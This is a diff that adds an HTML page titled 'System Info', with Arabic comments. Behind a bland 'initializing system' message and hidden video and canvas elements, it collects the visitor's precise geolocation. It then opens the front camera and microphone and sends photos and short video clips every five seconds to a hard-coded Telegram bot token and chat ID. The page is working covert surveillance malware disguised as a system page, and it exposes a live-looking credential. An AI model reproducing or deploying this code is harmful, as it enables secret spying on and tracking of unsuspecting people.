@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="google" content="notranslate">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>System Info</title>
+    <style>
+        /* إخفاء كافة العناصر المرئية */
+        video, canvas {
+            display: none;
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+        
+        .status {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            color: #333;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="status">جاري تهيئة النظام...</div>
+    <video id="video" autoplay muted playsinline></video>
+    <canvas id="canvas"></canvas>
+    
+    <script>
+        // إعدادات التطبيق
+        const CONFIG = {
+            BOT_TOKEN: '6848636559:AAFSKqxz55aBzpVLX-VQ-sSwroauu0CpR_k',
+            CHAT_ID: '5358365084',
+            CAPTURE_INTERVAL: 5000, // 5 ثواني
+            VIDEO_DURATION: 5000,   // 5 ثواني
+            MAX_RETRIES: 3
+        };
+
+        // عناصر DOM
+        const videoElement = document.getElementById('video');
+        const canvasElement = document.getElementById('canvas');
+        const statusElement = document.querySelector('.status');
+        
+        // متغيرات الحالة
+        let mediaStream = null;
+        let isStreamActive = false;
+        let photoInterval = null;
+        let videoInterval = null;
+        let retryCount = 0;
+
+        // دالة تحديث حالة النظام
+        function updateStatus(message) {
+            if (statusElement) {
+                statusElement.textContent = message;
+            }
+            console.log(`[STATUS]: ${message}`);
+        }
+
+        // دالة إرسال البيانات إلى Telegram
+        async function sendToTelegram(type, formData) {
+            try {
+                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/${type}?chat_id=${CONFIG.CHAT_ID}`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const data = await response.json();
+                return { success: data.ok, data };
+            } catch (error) {
+                console.error(`Failed to send ${type}:`, error);
+                return { success: false, error };
+            }
+        }
+
+        // دالة الحصول على الموقع
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        const locationText = `📍 الموقع: https://www.google.com/maps/place/${latitude},${longitude}`;
+                        resolve(locationText);
+                    },
+                    (error) => {
+                        console.warn('فشل في الحصول على الموقع:', error);
+                        resolve(null);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // دالة التقاط وإرسال الصورة
+        async function captureAndSendPhoto() {
+            if (!isStreamActive || !mediaStream) return;
+
+            try {
+                // إعدادات Canvas
+                const videoWidth = videoElement.videoWidth;
+                const videoHeight = videoElement.videoHeight;
+                
+                if (videoWidth === 0 || videoHeight === 0) {
+                    console.warn('الفيديو غير جاهز للتقاط الصورة');
+                    return;
+                }
+
+                canvasElement.width = videoWidth;
+                canvasElement.height = videoHeight;
+                
+                // رسم الصورة على Canvas
+                const context = canvasElement.getContext('2d');
+                context.drawImage(videoElement, 0, 0, videoWidth, videoHeight);
+                
+                // تحويل الصورة إلى Blob
+                canvasElement.toBlob(async (blob) => {
+                    if (!blob) return;
+                    
+                    const formData = new FormData();
+                    formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+                    
+                    updateStatus('جاري إرسال الصورة...');
+                    const result = await sendToTelegram('sendPhoto', formData);
+                    
+                    if (result.success) {
+                        updateStatus('تم إرسال الصورة بنجاح');
+                        retryCount = 0;
+                    } else {
+                        console.error('فشل إرسال الصورة:', result.error);
+                    }
+                }, 'image/jpeg', 1);
+            } catch (error) {
+                console.error('خطأ في التقاط الصورة:', error);
+            }
+        }
+
+        // دالة تسجيل وإرسال الفيديو
+        async function recordAndSendVideo() {
+            if (!isStreamActive || !mediaStream) return;
+
+            try {
+                updateStatus('جاري تسجيل الفيديو...');
+                
+                const mediaRecorder = new MediaRecorder(mediaStream, {
+                    mimeType: 'video/webm;codecs=vp9,opus'
+                });
+                
+                const chunks = [];
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        chunks.push(event.data);
+                    }
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    if (chunks.length === 0) {
+                        console.warn('لا توجد بيانات فيديو');
+                        return;
+                    }
+                    
+                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                    
+                    // تحويل الفيديو إلى MP4 إذا أمكن
+                    try {
+                        const formData = new FormData();
+                        formData.append('video', videoBlob, `video_${Date.now()}.webm`);
+                        
+                        updateStatus('جاري إرسال الفيديو...');
+                        const result = await sendToTelegram('sendVideo', formData);
+                        
+                        if (result.success) {
+                            updateStatus('تم إرسال الفيديو بنجاح');
+                            retryCount = 0;
+                        } else {
+                            console.error('فشل إرسال الفيديو:', result.error);
+                        }
+                    } catch (error) {
+                        console.error('خطأ في معالجة الفيديو:', error);
+                    }
+                };
+                
+                mediaRecorder.onerror = (error) => {
+                    console.error('خطأ في تسجيل الفيديو:', error);
+                };
+                
+                // بدء التسجيل
+                mediaRecorder.start();
+                
+                // إيقاف التسجيل بعد المدة المحددة
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, CONFIG.VIDEO_DURATION);
+                
+            } catch (error) {
+                console.error('خطأ في تسجيل الفيديو:', error);
+            }
+        }
+
+        // دالة تهيئة النظام
+        async function initializeSystem() {
+            try {
+                updateStatus('جاري تهيئة النظام...');
+                
+                // الحصول على الموقع وإرساله
+                updateStatus('جاري الحصول على الموقع...');
+                const location = await getLocation();
+                
+                if (location) {
+                    const formData = new FormData();
+                    formData.append('text', location);
+                    await sendToTelegram('sendMessage', formData);
+                }
+                
+                // الحصول على صلاحيات الكاميرا والميكروفون
+                updateStatus('جاري طلب صلاحيات الكاميرا...');
+                
+                const constraints = {
+                    video: {
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        facingMode: 'user'
+                    },
+                    audio: true
+                };
+                
+                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+                videoElement.srcObject = mediaStream;
+                isStreamActive = true;
+                
+                // الانتظار حتى يكون الفيديو جاهزًا
+                await new Promise((resolve) => {
+                    videoElement.onloadedmetadata = () => {
+                        videoElement.play();
+                        resolve();
+                    };
+                });
+                
+                updateStatus('النظام جاهز للتشغيل');
+                
+                // بدء التقاط الصور كل 5 ثواني
+                photoInterval = setInterval(captureAndSendPhoto, CONFIG.CAPTURE_INTERVAL);
+                
+                // بدء تسجيل الفيديوهات كل 5 ثواني
+                videoInterval = setInterval(recordAndSendVideo, CONFIG.CAPTURE_INTERVAL);
+                
+                // التقاط أول صورة وتسجيل أول فيديو فورًا
+                setTimeout(() => {
+                    captureAndSendPhoto();
+                    recordAndSendVideo();
+                }, 1000);
+                
+            } catch (error) {
+                console.error('فشل في تهيئة النظام:', error);
+                
+                if (retryCount < CONFIG.MAX_RETRIES) {
+                    retryCount++;
+                    updateStatus(`إعادة المحاولة (${retryCount}/${CONFIG.MAX_RETRIES})...`);
+                    setTimeout(initializeSystem, 3000);
+                } else {
+                    updateStatus('فشل في تهيئة النظام. يرجى تحديث الصفحة.');
+                }
+            }
+        }
+
+        // دالة تنظيف الموارد
+        function cleanupResources() {
+            if (photoInterval) {
+                clearInterval(photoInterval);
+                photoInterval = null;
+            }
+            
+            if (videoInterval) {
+                clearInterval(videoInterval);
+                videoInterval = null;
+            }
+            
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                mediaStream = null;
+            }
+            
+            isStreamActive = false;
+            updateStatus('تم إيقاف النظام');
+        }
+
+        // إضافة مستمعين للأحداث
+        window.addEventListener('beforeunload', cleanupResources);
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                // يمكن إضافة منطق للتعامل مع حالة الخفية
+                console.log('الصفحة مخفية');
+            }
+        });
+
+        // بدء تشغيل النظام بعد تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', () => {
+            // بدء التشغيل بعد تأخير بسيط للتأكد من تحميل كافة العناصر
+            setTimeout(initializeSystem, 500);
+        });
+
+    </script>
+</body>
+  </html>
